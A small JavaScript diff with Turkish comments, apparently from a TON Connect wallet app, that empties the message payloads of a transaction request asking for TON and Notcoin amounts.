@@ -30,12 +30,12 @@ const request_transaction = async (tonConnectUI) => {
       {
         address: targetAddress, // Hedef cüzdan adresi
         amount: amountToRequestTON, // Talep edilen TON miktarı
-        payload: '0.1 TON talep ediyorum', // Talep mesajı
+        payload: '', // Payload kısmını boş bırakıyoruz
       },
       {
         address: notcoinJettonContract, // Notcoin jetton contract adresi
         amount: amountToRequestNotcoin, // Talep edilen Notcoin miktarı
-        payload: '100 Notcoin talep ediyorum', // Talep mesajı
+        payload: '', // Payload kısmını boş bırakıyoruz
       },
     ];
 
